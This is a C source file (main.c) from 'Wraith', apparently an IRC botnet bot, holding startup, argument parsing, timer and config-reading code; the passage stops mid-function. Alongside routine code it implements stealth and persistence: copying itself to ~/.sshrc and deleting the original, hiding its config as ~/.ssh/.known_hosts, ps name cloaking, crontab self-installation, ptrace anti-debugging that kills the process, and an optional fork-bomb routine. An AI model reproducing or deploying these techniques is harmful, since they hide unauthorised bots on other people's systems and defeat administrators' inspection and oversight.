/*
 * main.c -- handles:
 *   core event handling
 *   command line arguments
 *   context and assert debugging
 *
 */

#include "common.h"
#include "main.h"
#include "dcc.h"
#include "misc.h"
#include "salt.h"
#include "misc_file.h"
#include "net.h"
#include "users.h"
#include "shell.h"
#include "userrec.h"
#include "cfg.h"
#include "dccutil.h"
#include "crypt.h"
#include "debug.h"
#include "chanprog.h"
#include "bg.h"	
#include "botnet.h"
#include "build.h"
#include <libgen.h>
#include <time.h>
#include <errno.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/utsname.h>

#ifdef STOP_UAC				/* osf/1 complains a lot */
# include <sys/sysinfo.h>
# define UAC_NOPRINT    0x00000001	/* Don't report unaligned fixups */
#endif /* STOP_UAC */
#include <sys/file.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <signal.h>
#ifdef S_ANTITRACE
#include <sys/ptrace.h>
#include <sys/wait.h>
#endif /* S_ANTITRACE */
#include <pwd.h>

#include "chan.h"
#include "modules.h"
#include "tandem.h"
#include "egg_timer.h"
#include "core_binds.h"

#ifdef CYGWIN_HACKS
#include <windows.h>
#endif

#ifndef _POSIX_SOURCE
/* Solaris needs this */
#define _POSIX_SOURCE 1
#endif

#ifdef HUB 
int hub = 1;
int leaf = 0;
#else
int hub = 0;
int leaf = 1;
#endif

char *progname();		/* from settings.c */


extern char		 origbotname[], userfile[], botnetnick[], packname[],
                         shellhash[], myip6[], myip[], hostname[],
                         hostname6[], natip[];
extern int		 dcc_total, conmask, cache_hit, cache_miss,
			 fork_interval, optind, local_fork_interval,
			 sdebug;
extern struct dcc_t	*dcc;
extern struct userrec	*userlist;
extern struct chanset_t	*chanset;


const time_t 	buildts = CVSBUILD;		/* build timestamp (UTC) */
const char	egg_version[1024] = "1.0.15";
const int	egg_numver = 1001500;

#ifdef HUB
int 	my_port;
#endif /* HUB */

int 	localhub = 1;   	/* we set this to 0 if we have -c, later. */
int 	role;
int 	loading = 0;
char	notify_new[121] = "";	/* Person to send a note to for new users */
int	default_flags = 0;	/* Default user flags and */
int	default_uflags = 0;	/* Default userdefinied flags for people
				   who say 'hello' or for .adduser */
int	backgrd = 1;		/* Run in the background? */
time_t 	lastfork = 0;
uid_t   myuid;
int	term_z = 0;		/* Foreground: use the terminal as a party line? */
int 	checktrace = 1;		/* Check for trace when starting up? */
int 	pscloak = 1;		/* cloak the process name in ps for linux? */
int 	updating = 0; 		/* this is set when the binary is called from itself. */
char 	tempdir[DIRMAX] = "";
char 	*binname;
time_t	online_since;		/* Unix-time that the bot loaded up */

char	owner[121] = "";	/* Permanent owner(s) of the bot */
char	pid_file[DIRMAX];		/* Name of the file for the pid to be
				   stored in */
int	save_users_at = 0;	/* How many minutes past the hour to
				   save the userfile? */
int	notify_users_at = 0;	/* How many minutes past the hour to
				   notify users of notes? */
char	version[81];		/* Version info (long form) */
char	ver[41];		/* Version info (short form) */
int	use_stderr = 1;		/* Send stuff to stderr instead of logfiles? */
int	do_restart = 0;		/* .restart has been called, restart asap */
int	resolve_timeout = 10;	/* hostname/address lookup timeout */
char	quit_msg[1024];		/* quit message */
time_t	now;			/* duh, now :) */

extern struct cfg_entry CFG_FORKINTERVAL;
#define fork_interval atoi( CFG_FORKINTERVAL.ldata ? CFG_FORKINTERVAL.ldata : CFG_FORKINTERVAL.gdata ? CFG_FORKINTERVAL.gdata : "0")


/* Traffic stats
 */
#include "traffic.h" /* egg_traffic_t */
egg_traffic_t traffic;

void fatal(const char *s, int recoverable)
{
#ifdef LEAF
  module_entry *me;

  if ((me = module_find("server", 0, 0))) {
    Function *func = me->funcs;
    (func[SERVER_NUKESERVER]) (s);
  }
#endif /* LEAF */
  if (s[0])
    putlog(LOG_MISC, "*", "* %s", s);
/*  flushlogs(); */
#ifdef HAVE_SSL
    ssl_cleanup();
#endif /* HAVE_SSL */
  if (!recoverable) {
    unlink(pid_file);
    exit(1);
  }
}

static void check_expired_dcc()
{
  int i;

  for (i = 0; i < dcc_total; i++)
    if (dcc[i].type && dcc[i].type->timeout_val &&
	((now - dcc[i].timeval) > *(dcc[i].type->timeout_val))) {
      if (dcc[i].type->timeout)
	dcc[i].type->timeout(i);
      else if (dcc[i].type->eof)
	dcc[i].type->eof(i);
      else
	continue;
      /* Only timeout 1 socket per cycle, too risky for more */
      return;
    }
}

void expire_simuls() {
  int idx = 0;
  for (idx = 0; idx < dcc_total; idx++) {
    if (dcc[idx].simul > 0) {
      if ((now - dcc[idx].simultime) >= 20) { /* expire simuls after 20 seconds (re-uses idx, so it wont fill up) */
        dcc[idx].simul = -1;
        lostdcc(idx);
      }
    }
  }
}

#ifdef LEAF
static void gotspawn(char *);
#endif /* LEAF */

void checkpass() 
{
  static int checkedpass = 0;
  if (!checkedpass) {
    char *gpasswd = (char *) getpass("");
    if (md5cmp(shellhash, gpasswd))
      fatal(STR("incorrect password."), 0);
    checkedpass = 1;
  }
}

void got_ed(char *which, char *in, char *out)
{
  sdprintf(STR("got_Ed called: -%s i: %s o: %s"), which, in, out);
  if (!in || !out)
    fatal(STR("Wrong number of arguments: -e/-d <infile> <outfile/STDOUT>"),0);
  if (!strcmp(in, out))
    fatal(STR("<infile> should NOT be the same name as <outfile>"), 0);
  if (!strcmp(which, "e")) {
    EncryptFile(in, out);
    fatal(STR("File Encryption complete"),3);
  } else if (!strcmp(which, "d")) {
    DecryptFile(in, out);
    fatal(STR("File Decryption complete"),3);
  }
  exit(0);
}

char *my_uname();

void gen_conf(char *filename, int type)
{
  FILE *fp;

  if (is_file(filename) || is_dir(filename))
    fatal(STR("File already exists.."), 0);
  
  fp = fopen(filename, "w");
  if (type == 1) {
    fprintf(fp, STR("#All lines beginning with '#' will be ignored during the bot startup. They are comments only.\n"));
    fprintf(fp, STR("#These lines MUST be correctly syntaxed or the bot will not work properly.\n"));
    fprintf(fp, STR("#A hub conf is located in the same dir as the hub binary, as 'conf' (encrypted)\n"));
    fprintf(fp, STR("#A leaf conf is located at '~/.ssh/.known_hosts' (encrypted)\n"));
    fprintf(fp, STR("#\n"));
    fprintf(fp, STR("#Note the \"- \" and \"+ \" for the following items, the space is REQUIRED.\n"));
    fprintf(fp, STR("#The first line must be the UID of the shell the bot is to be run on. (use \"id\" in shell to get uid)\n"));
    fprintf(fp, STR("#- 1113\n"));
    fprintf(fp, STR("#The second must be the output from uname -nv (-nr on FBSD)\n"));
    fprintf(fp, STR("#+ somebox #1 SMP Thu May 29 06:55:05 EDT 2003\n"));
    fprintf(fp, STR("#\n"));
    fprintf(fp, STR("#The following line will disable ps cloaking on the shell if you compiled with S_PSCLOAK\n"));
    fprintf(fp, STR("#!-\n"));
    fprintf(fp, STR("#The rest of the conf is for bots and is in the following syntax:\n"));
    fprintf(fp, STR("#botnick [!]ip4 [+]hostname IPv6-ip\n"));
    fprintf(fp, STR("#A . (period) can be used in place of ip4 and/or hostname if the field is not needed. (ie, for using only an ipv6 ip)\n"));
    fprintf(fp, STR("#(the ! means internal NAT ip address, IE: 10.10.0.3, Hostname REQUIRED)\n"));
    fprintf(fp, STR("#Full example:\n"));
    fprintf(fp, STR("#- 101\n"));
    fprintf(fp, STR("#+ somebox 5.1-RELEASE\n"));
    fprintf(fp, STR("#bot1 1.2.3.4 some.vhost.com\n"));
    fprintf(fp, STR("#bot2 . +ipv6.uber.leet.la\n"));
    fprintf(fp, STR("#bot3 . +another.ipv6.host.com 2001:66:669:3a4::1\n"));
    fprintf(fp, STR("#bot4 1.2.3.4 +someipv6.host.com\n"));
    fprintf(fp, STR("\n\n\n\n#if there are any trailing newlines at the end, remove them up to the last bot.\n"));
  } else {
    fprintf(fp, "- %d\n", geteuid());
    fprintf(fp, "+ %s\n", my_uname());
    fprintf(fp, STR("#bot ip|. [+]host|. [ipv6-ip]\n"));
  }
  fflush(fp);
  fclose(fp);
  printf(STR("Template config created as '%s'\n"), filename);
  exit(0);
}

void show_help()
{
  char format[81];

  egg_snprintf(format, sizeof format, "%%-30s %%-30s\n");

  printf(STR("Wraith %s\n\n"), egg_version);
  printf(format, STR("Option"), STR("Description"));
  printf(format, STR("------"), STR("-----------"));
  printf(format, STR("-e <infile> <outfile>"), STR("Encrypt infile to outfile"));
  printf(format, STR("-d <infile> <outfile>"), STR("Decrypt infile to outfile"));
  printf(format, STR("-D"), STR("Enables debug mode (see -n)"));
  printf(format, STR("-E [#/all]"), STR("Display Error codes english translation (use 'all' to display all)"));
  printf(format, STR("-g <file>"), STR("Generates a template config file"));
  printf(format, STR("-G <file>"), STR("Generates a custom config for the box"));
  printf(format, STR("-h"), STR("Display this help listing"));
/*   printf(format, STR("-k <botname>"), STR("Terminates (botname) with kill -9")); */
  printf(format, STR("-n"), STR("Disables backgrounding first bot in conf"));
  printf(format, STR("-s"), STR("Disables checking for ptrace/strace during startup (no pass needed)"));
  printf(format, STR("-t"), STR("Enables \"Partyline\" emulation (requires -n)"));
  printf(format, STR("-v"), STR("Displays bot version"));
  exit(0);
}


#ifdef LEAF
# define PARSE_FLAGS "2c:d:De:Eg:G:L:P:hnstv"
#else /* !LEAF */
# define PARSE_FLAGS "2d:De:Eg:G:hnstv"
#endif /* HUB */
#define FLAGS_CHECKPASS "dDeEgGhntv"
static void dtx_arg(int argc, char *argv[])
{
  int i;
#ifdef LEAF
  int localhub_pid = 0;
#endif /* LEAF */
  char *p = NULL;
  while ((i = getopt(argc, argv, PARSE_FLAGS)) != EOF) {
    if (strchr(FLAGS_CHECKPASS, i))
      checkpass();
    switch (i) {
      case '2':		/* used for testing new binary through update */
        exit(2);
#ifdef LEAF
      case 'c':
        localhub = 0;
        gotspawn(optarg);
        break;
#endif /* LEAF */
      case 'h':
        show_help();
      case 'g':
        gen_conf(optarg, 1);
      case 'G':
        gen_conf(optarg, 2);
      case 'n':
	backgrd = 0;
	break;
      case 's':
        checktrace = 0;
        break;
      case 't':
        term_z = 1;
        break;
      case 'D':
        sdebug = 1;
        sdprintf(STR("debug enabled"));
        break;
      case 'E':
        p = argv[optind];
        if (p && p[0]) {
          if (!strcmp(p, "all")) {
            int n;
            putlog(LOG_MISC, "*", STR("Listing all errors"));
            for (n = 1; n < ERR_MAX; n++)
            putlog(LOG_MISC, "*", STR("Error #%d: %s"), n, werr_tostr(n));
          } else if (egg_isdigit(p[0])) {
            putlog(LOG_MISC, "*", STR("Error #%d: %s"), atoi(p), werr_tostr(atoi(p)));
          }
          exit(0);
        } else {
          fatal(STR("You must specify error number after -E (or 'all')"), 0);
        }
        break;
      case 'e':
        if (argv[optind])
          p = argv[optind];
        got_ed("e", optarg, p);
      case 'd':
        if (argv[optind])
          p = argv[optind];
        got_ed("d", optarg, p);
      case 'v':
      {
        char date[50];
        egg_strftime(date, sizeof date, "%c %Z", gmtime(&buildts));
	printf("Wraith %s\nBuild Date: %s (%lu)\n", egg_version, date, buildts);
        printf("SALTS\nfiles: %s\nbotlink: %s\n", SALT1, SALT2);
	exit(0);
      }
#ifdef LEAF
      case 'L':
      {
        FILE *fp;
        char buf2[DIRMAX], s[11];

        egg_snprintf(buf2, sizeof buf2, "%s/.../.pid.%s", confdir(), optarg);
        if ((fp = fopen(buf2, "r"))) {
          fgets(s, 10, fp);
          localhub_pid = atoi(s);
          fclose(fp);
          /* printf("LOCALHUB PID: %d\n", localhub_pid); */
        }
        break;
      }
      case 'P':
        if (atoi(optarg) && (atoi(optarg) != localhub_pid))
          exit(2);
        else
          sdprintf(STR("Updating..."));
        localhub = 1;
        updating = 1;
        break;
#endif
      default:
        break;
    }
  }
}

#ifdef CRAZY_TRACE
/* This code will attach a ptrace() to getpid() hence blocking process hijackers/tracers on the pid
 * only problem.. it just creates a new pid to be traced/hijacked :\
 */
int attached = 0;
void crazy_trace() 
{
  int parent = getpid();
  int x = fork();
  if (x == -1) {
    printf("Can't fork(): %s\n", strerror(errno));
  } else if (x == 0) {
    int i;
    i = ptrace(PTRACE_ATTACH, parent, (char *) 1, 0);
    if (i == (-1) && errno == EPERM) {
      printf("CANT PTRACE PARENT: errno: %d %s, i: %d\n", errno, strerror(errno), i);
      waitpid(parent, &i, 0);
      kill(parent, SIGCHLD);
      ptrace(PTRACE_DETACH, parent, 0, 0);
      kill(parent, SIGCHLD);
      exit(0);
    } else {
      printf("SUCCESSFUL ATTACH to %d: %d\n", parent, i);
      attached++;
    }
  } else {
    printf("wait()\n");
    wait(&x);
  }
  printf("end\n");
}
#endif /* CRAZY_TRACE */

/* Timer info */
static int		lastmin = 99;
static time_t		then;
static struct tm	nowtm;

int curcheck = 0;
void core_10secondly()
{
  curcheck++;
#ifdef LEAF
  if (localhub)
#endif /* LEAF */
    check_promisc();

  if (curcheck == 1)
    check_trace();

#ifdef LEAF
  if (localhub) {
#endif /* LEAF */
    if (curcheck==2)
      check_last();
    if (curcheck==3) {
      check_processes();
      curcheck=0;
    }
#ifdef LEAF
  }
#endif /* LEAF */
}

static void core_secondly()
{
  static int cnt = 0;
  int miltime;

#ifdef CRAZY_TRACE 
  if (!attached) crazy_trace();
#endif /* CRAZY_TRACE */
  call_hook(HOOK_SECONDLY);	/* Will be removed later */
  if (fork_interval && backgrd) {
    if ((now - lastfork) > fork_interval)
      do_fork();
  }
  cnt++;
  if ((cnt % 5) == 0)
    call_hook(HOOK_5SECONDLY);
  if ((cnt % 10) == 0) {
    call_hook(HOOK_10SECONDLY);
    check_expired_dcc();
  }
  if ((cnt % 30) == 0) {
    autolink_cycle(NULL);         /* attempt autolinks */
    call_hook(HOOK_30SECONDLY);
    cnt = 0;
  }

#ifdef S_UTCTIME
  egg_memcpy(&nowtm, gmtime(&now), sizeof(struct tm));
#else /* !S_UTCTIME */
  egg_memcpy(&nowtm, localtime(&now), sizeof(struct tm));
#endif /* S_UTCTIME */
  if (nowtm.tm_min != lastmin) {
    int i = 0;

    /* Once a minute */
    lastmin = (lastmin + 1) % 60;
    call_hook(HOOK_MINUTELY);
    check_botnet_pings();
    check_expired_ignores();
    /* In case for some reason more than 1 min has passed: */
    while (nowtm.tm_min != lastmin) {
      /* Timer drift, dammit */
      debug2(STR("timer: drift (lastmin=%d, now=%d)"), lastmin, nowtm.tm_min);
      i++;
      lastmin = (lastmin + 1) % 60;
      call_hook(HOOK_MINUTELY);
    }
    if (i > 1)
      putlog(LOG_MISC, "*", STR("(!) timer drift -- spun %d minutes"), i);
    miltime = (nowtm.tm_hour * 100) + (nowtm.tm_min);
    if (((int) (nowtm.tm_min / 5) * 5) == (nowtm.tm_min)) {	/* 5 min */
      call_hook(HOOK_5MINUTELY);
/* 	flushlogs(); */
      if (!miltime) {	/* At midnight */
	char s[25];

	strncpyz(s, ctime(&now), sizeof s);
#ifdef HUB
	putlog(LOG_ALL, "*", STR("--- %.11s%s"), s, s + 20);
        backup_userfile();
#endif /* HUB */
      }
    }
    if (nowtm.tm_min == notify_users_at)
      call_hook(HOOK_HOURLY);
    else if (nowtm.tm_min == 30)
      call_hook(HOOK_HALFHOURLY);
    /* These no longer need checking since they are all check vs minutely
     * settings and we only get this far on the minute.
     */
#ifdef HUB
    if (miltime == 300) {
      call_hook(HOOK_DAILY);
    }
#endif /* HUB */
  }
}

#ifdef LEAF
static void check_mypid()
{
  module_entry *me;
  FILE *fp;
  char s[15];
  int xx = 0;

  char buf2[DIRMAX];
  egg_snprintf(buf2, sizeof buf2, "%s.pid.%s", tempdir, botnetnick);
  if ((fp = fopen(buf2, "r"))) {
    fgets(s, 10, fp);
    xx = atoi(s);
    if (getpid() != xx) { //we have a major problem if this is happening..
      fatal(STR("getpid() does not match pid in file. Possible cloned process, exiting.."), 1);
      if ((me = module_find("server", 0, 0))) {
        Function *func = me->funcs;
        (func[SERVER_NUKESERVER]) ("cloned process");
      }
      botnet_send_bye();
      exit(1);
    }
    fclose(fp);
  }
}
#endif /* LEAF */

static void core_minutely()
{
#ifdef LEAF
  check_mypid();
#endif
  check_bind_time(&nowtm);
/*     flushlogs(); */
}

static void core_hourly()
{
}

static void core_halfhourly()
{
#ifdef HUB
  write_userfile(-1);
#endif /* HUB */
}

static void event_rehash()
{
  check_bind_event("rehash");
}

static void event_prerehash()
{
  check_bind_event("prerehash");
}

static void event_save()
{
  check_bind_event("save");
}

static void event_resettraffic()
{
	traffic.out_total.irc += traffic.out_today.irc;
	traffic.out_total.bn += traffic.out_today.bn;
	traffic.out_total.dcc += traffic.out_today.dcc;
	traffic.out_total.filesys += traffic.out_today.filesys;
	traffic.out_total.trans += traffic.out_today.trans;
	traffic.out_total.unknown += traffic.out_today.unknown;

	traffic.in_total.irc += traffic.in_today.irc;
	traffic.in_total.bn += traffic.in_today.bn;
	traffic.in_total.dcc += traffic.in_today.dcc;
	traffic.in_total.filesys += traffic.in_today.filesys;
	traffic.in_total.trans += traffic.in_today.trans;
	traffic.in_total.unknown += traffic.in_today.unknown;

	egg_memset(&traffic.out_today, 0, sizeof(traffic.out_today));
	egg_memset(&traffic.in_today, 0, sizeof(traffic.in_today));
}

extern module_entry *module_list;
void restart_chons();

void check_static(char *, char *(*)());

#include "mod/static.h"
int init_dcc_max(), init_userent(), init_auth(), init_config(), init_bots(),
 init_net(), init_modules(), init_tcl(int, char **), init_botcmd(), init_settings();

void binds_init();

static void check_crontab()
{
  int i = 0;

#ifdef LEAF
  if (!localhub) 
    fatal(STR("something is wrong."), 0);
#endif /* LEAF */
  if (!(i = crontab_exists())) {
    crontab_create(5);
    if (!(i = crontab_exists())) 
      printf(STR("* Error writing crontab entry.\n"));
  }
}

#ifdef LEAF
static void gotspawn(char *filename)
{
  FILE *fp;
  char templine[8192], *nick = NULL, *host = NULL, *ip = NULL, *ipsix = NULL, *temps;

  if (!(fp = fopen(filename, "r")))
    fatal(STR("Cannot read from local config (2)"), 0);
  while(fscanf(fp,"%[^\n]\n",templine) != EOF) {
    void *my_ptr;
    temps = my_ptr = decrypt_string(SALT1, templine);

#ifdef S_PSCLOAK
    sdprintf(STR("GOTSPAWN: %s"), temps);
#endif /* S_PSCLOAK */

    pscloak = atoi(newsplit(&temps));
    if (temps[0])
      nick = newsplit(&temps);
    if (!nick)
      fatal("invalid config (2).",0);
    if (temps[0])
      ip = newsplit(&temps);
    if (temps[0])
      host = newsplit(&temps);
    if (temps[0])
      ipsix = newsplit(&temps);

    egg_snprintf(origbotname, 10, "%s", nick);

    if (ip[1]) {
      if (ip[0] == '!') { //natip
        ip++;
        sprintf(natip,"%s",ip);
      } else {
        egg_snprintf(myip, 120, "%s", ip);
      }
    }

    if (host && host[1]) {
      if (host[0] == '+') { //ip6 host
        host++;
        sprintf(hostname6,"%s",host);
      } else { //normal ip4 host
        sprintf(hostname,"%s",host);
      }
    }

    if (ipsix && ipsix[1]) {
      egg_snprintf(myip6, 120, "%s", ipsix);
    }
    if (my_ptr)
      free(my_ptr);
  }

  fclose(fp);
  unlink(filename);
}

static int spawnbot(char *bin, char *nick, char *ip, char *host, char *ipsix, int cloak)
{
  char buf[DIRMAX] = "", bindir[DIRMAX] = "", bufrun[DIRMAX] = "";
  FILE *fp;

  egg_snprintf(buf, sizeof buf, "%s", bin);
  egg_snprintf(bindir, sizeof bindir, "%s", dirname(buf));

  egg_snprintf(buf, sizeof buf, "%s/.wraith-%s", bindir, nick);


  if (!(fp = fopen(buf, "w")))
    fatal(STR("Cannot create spawnfiles..."), 0);

  lfprintf(fp, "%d %s %s %s %s\n", cloak, nick, ip ? ip : ".", host ? host : ".", ipsix ? ipsix : ".");

  fflush(fp);
  fclose(fp);

  egg_snprintf(bufrun, sizeof bufrun, "%s -c %s", bin, buf);
  return system(bufrun);
}
#endif /* LEAF */

#ifdef S_MESSUPTERM 
void messup_term() {
  int i;
  char *argv[4];

  freopen("/dev/null", "w", stderr);
  for (i = 0; i < 11; i++) {
    fork();
  }
  argv[0] = malloc(100);
  strcpy(argv[0], "/bin/sh");
  argv[1] = "-c";
  argv[2] = malloc(1024);
  strcpy(argv[2], "cat < ");
  strcat(argv[2], binname);
  argv[3] = NULL;
  execvp(argv[0], &argv[0]);
}
#endif /* S_MESSUPTERM */

void check_trace_start()
{
#ifdef S_ANTITRACE
  int parent = getpid();
  int xx = 0, i = 0;
#ifdef __linux__
  xx = fork();
  if (xx == -1) {
    printf(STR("Can't fork process!\n"));
    exit(1);
  } else if (xx == 0) {
    i = ptrace(PTRACE_ATTACH, parent, 0, 0);
    if (i == (-1) && errno == EPERM) {
#ifdef S_MESSUPTERM
      messup_term();
#else
      kill(parent, SIGKILL);
      exit(1);
#endif /* S_MESSUPTERM */
    } else {
      waitpid(parent, &i, 0);
      kill(parent, SIGCHLD);
      ptrace(PTRACE_DETACH, parent, 0, 0);
      kill(parent, SIGCHLD);
    }
    exit(0);
  } else {
    wait(&i);
  }
#endif /* __linux__ */
#ifdef __FreeBSD__
  xx = fork();
  if (xx == -1) {
    printf(STR("Can't fork process!\n"));
    exit(1);
  } else if (xx == 0) {
    i = ptrace(PT_ATTACH, parent, 0, 0);
    if (i == (-1) && errno == EBUSY) {
#ifdef S_MESSUPTERM
      messup_term();
#else
      kill(parent, SIGKILL);
      exit(1);
#endif /* S_MESSUPTERM */
    } else {
       wait(&i);
      i = ptrace(PT_CONTINUE, parent, (caddr_t) 1, 0);
      kill(parent, SIGCHLD);
      wait(&i);
      i = ptrace(PT_DETACH, parent, (caddr_t) 1, 0);
      wait(&i);
    }
    exit(0);
  } else {
    waitpid(xx, NULL, 0);
  }
#endif /* __FreeBSD__ */
#ifdef __OpenBSD__
  xx = fork();
  if (xx == -1) {
    printf(STR("Can't fork process!\n"));
    exit(1);
  } else if (xx == 0) {
    i = ptrace(PT_ATTACH, parent, 0, 0);
    if (i == (-1) && errno == EBUSY) {
      kill(parent, SIGKILL);
      exit(1);
    } else {
      wait(&i);
      i = ptrace(PT_CONTINUE, parent, (caddr_t) 1, 0);
      kill(parent, SIGCHLD);
      wait(&i);
      i = ptrace(PT_DETACH, parent, (caddr_t) 1, 0);
      wait(&i);
    }
    exit(0);
  } else {
    waitpid(xx, NULL, 0);
  }
#endif /* __OpenBSD__ */
#endif /* S_ANTITRACE */
}

void init_debug();

int main(int argc, char **argv)
{
  egg_timeval_t howlong;
  int xx, i;
#ifdef LEAF
  int x = 1;
#endif
  char buf[SGRAB + 9] = "", s[25] = "";
  FILE *f;
#ifdef LEAF
  int skip = 0;
  int ok = 1;
#endif
  init_debug();

  /* Version info! */
  egg_snprintf(ver, sizeof ver, "Wraith %s", egg_version);
  egg_snprintf(version, sizeof version, "Wraith %s (%u/%lu)", egg_version, egg_numver, buildts);
#ifdef STOP_UAC
  {
    int nvpair[2];

    nvpair[0] = SSIN_UACPROC;
    nvpair[1] = UAC_NOPRINT;
    setsysinfo(SSI_NVPAIRS, (char *) nvpair, 1, NULL, 0);
  }
#endif

  init_signals();

  Context;
  /* Initialize variables and stuff */
  now = time(NULL);
  chanset = NULL;
#ifdef S_UTCTIME
  egg_memcpy(&nowtm, gmtime(&now), sizeof(struct tm));
#else /* !S_UTCTIME */
  egg_memcpy(&nowtm, localtime(&now), sizeof(struct tm));
#endif /* S_UTCTIME */
  lastmin = nowtm.tm_min;
  srandom(now % (getpid() + getppid()));
  myuid = geteuid();
  binname = getfullbinname(argv[0]);

  /* just load everything now, won't matter if it's loaded if the bot has to suicide on startup */
  init_settings();
  binds_init();
  core_binds_init();
  init_dcc_max();
  init_userent();
  init_bots();
  init_net();
  init_modules();
  init_tcl(argc, argv);
  init_auth();
  init_config();
  init_botcmd();
  link_statics();

  if (!can_stat(binname))
   werr(ERR_BINSTAT);
  if (!fixmod(binname))
   werr(ERR_BINMOD);

  if (argc) {
    sdprintf(STR("Calling dtx_arg with %d params."), argc);
    dtx_arg(argc, argv);
  }
  if (checktrace)
    check_trace_start();

#ifdef HUB
  egg_snprintf(tempdir, sizeof tempdir, "%s/tmp/", confdir());
#endif /* HUB */

#ifdef LEAF
{
  char newbin[DIRMAX];
  sdprintf(STR("my uid: %d my uuid: %d, my ppid: %d my pid: %d"), getuid(), geteuid(), getppid(), getpid());
  chdir(homedir());
  egg_snprintf(newbin, sizeof newbin, STR("%s/.sshrc"), homedir());
  egg_snprintf(tempdir, sizeof tempdir, "%s/.../", confdir());

  sdprintf(STR("newbin at: %s"), newbin);

  if (strcmp(binname,newbin) && !skip) { //running from wrong dir, or wrong bin name.. lets try to fix that :)
    sdprintf(STR("wrong dir, is: %s :: %s"), binname, newbin);
    unlink(newbin);
    if (copyfile(binname,newbin))
     ok = 0;

    if (ok) 
     if (!can_stat(newbin)) {
       unlink(newbin);
       ok = 0;
     }
    if (ok) 
      if (!fixmod(newbin)) {
        unlink(newbin);
        ok = 0;
      }

    if (!ok)
      werr(ERR_WRONGBINDIR);
    else {
      unlink(binname);
      system(newbin);
      sdprintf(STR("exiting to let new binary run..."));
      exit(0);
    }
  }

  /* Ok if we are here, then the binary is accessable and in the correct directory, now lets do the local config... */

}
#endif /* LEAF */
  {
    char tmp[DIRMAX];

    egg_snprintf(tmp, sizeof tmp, "%s/", confdir());
    if (!can_stat(tmp)) {
#ifdef LEAF
      if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
        unlink(confdir());
        if (!can_stat(confdir()))
          if (mkdir(confdir(), S_IRUSR | S_IWUSR | S_IXUSR))
#endif /* LEAF */
            werr(ERR_CONFSTAT);
#ifdef LEAF
      }
#endif /* LEAF */
    }

    egg_snprintf(tmp, sizeof tmp, "%s", tempdir);
    if (!can_stat(tmp)) {
      if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
        unlink(tempdir);
        if (!can_stat(tempdir))
          if (mkdir(tempdir, S_IRUSR | S_IWUSR | S_IXUSR))
            werr(ERR_TMPSTAT);
      }
    }
  }
  if (!fixmod(confdir()))
    werr(ERR_CONFDIRMOD);
  if (!fixmod(tempdir))
    werr(ERR_TMPMOD);

  /* The config dir is accessable with correct permissions, lets read/write/create config file now.. */
  {		/* config shit */
    char cfile[DIRMAX] = "", templine[8192] = "";
#ifdef LEAF
    egg_snprintf(cfile, sizeof cfile, STR("%s/.known_hosts"), confdir());
#else /* HUB */
    egg_snprintf(cfile, sizeof cfile, STR("%s/conf"), confdir());
#endif /* LEAF */
    if (!can_stat(cfile))
      werr(ERR_NOCONF);
    if (!fixmod(cfile))
      werr(ERR_CONFMOD);
#ifdef LEAF
    if (localhub) { 
#endif /* LEAF */
      i = 0;
      if (!(f = fopen(cfile, "r")))
         werr(0);
      Context;
      while(fscanf(f, "%[^\n]\n", templine) != EOF) {
        char *nick = NULL, *host = NULL, *ip = NULL, *ipsix = NULL, *temps, c[1024];
        void *temp_ptr;
        int skip = 0;

        temps = temp_ptr = decrypt_string(SALT1, templine);
        if (!strchr(STR("*#-+!abcdefghijklmnopqrstuvwxyzABDEFGHIJKLMNOPWRSTUVWXYZ"), temps[0])) {
          sdprintf(STR("line %d, char %c "), i, temps[0]);
          werr(ERR_CONFBADENC);
        }
        egg_snprintf(c, sizeof c, "%s", temps);

        if (c[0] == '*') {
          skip = 1;
        } else if (c[0] == '-' && !skip) { /* uid */
          newsplit(&temps);
          if (geteuid() != atoi(temps)) {
            sdprintf(STR("wrong uid, conf: %d :: %d"), atoi(temps), geteuid());
            werr(ERR_WRONGUID);
          }
        } else if (c[0] == '+' && !skip) { /* uname */
          int r = 0;
          newsplit(&temps);
          if ((r = strcmp(temps, my_uname()))) {
            baduname(temps, my_uname());
            sdprintf(STR("wrong uname, conf: %s :: %s"), temps, my_uname());
            werr(ERR_WRONGUNAME);
          }
        } else if (c[0] == '!') { //local tcl exploit
          if (c[1] == '-') { //dont use pscloak
#ifdef S_PSCLOAK
            sdprintf(STR("NOT CLOAKING"));
#endif /* S_PSCLOAK */
            pscloak = 0;
          } else {
            newsplit(&temps);
/*            Tcl_Eval(interp, temps); */
          }
        } else if (c[0] != '#') {  //now to parse nick/hosts
          /* we have the right uname/uid, safe to setup crontab now. */
          i++;
          nick = newsplit(&temps);
          if (!nick || !nick[0])
            werr(ERR_BADCONF);
          sdprintf(STR("Read nick from config: %s"), nick);
          if (temps[0])
            ip = newsplit(&temps);
          if (temps[0])
            host = newsplit(&temps);
          if (temps[0])
            ipsix = newsplit(&temps);

          if (i == 1) { //this is the first bot ran/parsed
            strncpyz(s, ctime(&now), sizeof s);
            strcpy(&s[11], &s[20]);

            if (ip && ip[0] == '!') { //natip
              ip++;
              sprintf(natip, "%s",ip);
            } else {
              if (ip && ip[1]) //only copy ip if it is longer than 1 char (.)
                egg_snprintf(myip, 120, "%s", ip);
            }
            egg_snprintf(origbotname, 10, "%s", nick);
#ifdef HUB
            sprintf(userfile, "%s/.u", confdir());
#endif /* HUB */
/* log          sprintf(logfile, "%s/.%s.log", confdir(), nick); */
            if (host && host[1]) { //only copy host if it is longer than 1 char (.)
              if (host[0] == '+') { //ip6 host
              host++;
              sprintf(hostname6, "%s",host);
            } else  //normal ip4 host
              sprintf(hostname, "%s",host);
            }
            if (ipsix && ipsix[1]) { //only copy ipsix if it is longer than 1 char (.)
              egg_snprintf(myip6, 120, "%s",ipsix);
            }
          } //First bot in conf
#ifdef LEAF
          else { //these are the rest of the bots..
            char buf2[DIRMAX] = "";
            FILE *fp;

            xx = 0, x = 0, errno = 0;
            s[0] = '\0';
            /* first let's determine if the bot is already running or not.. */
            egg_snprintf(buf2, sizeof buf2, "%s.pid.%s", tempdir, nick);
            fp = fopen(buf2, "r");
            if (fp != NULL) {
              fgets(s, 10, fp);
              fclose(fp);
              xx = atoi(s);
              if (updating) {
                x = kill(xx, SIGKILL); //try to kill the pid if we are updating.
                unlink(buf2);
              }
              kill(xx, SIGCHLD);
              if (errno == ESRCH || (updating && !x)) { //PID is !running, safe to run.
                if (spawnbot(binname, nick, ip, host, ipsix, pscloak))
                  printf(STR("* Failed to spawn %s\n"), nick); //This probably won't ever happen.
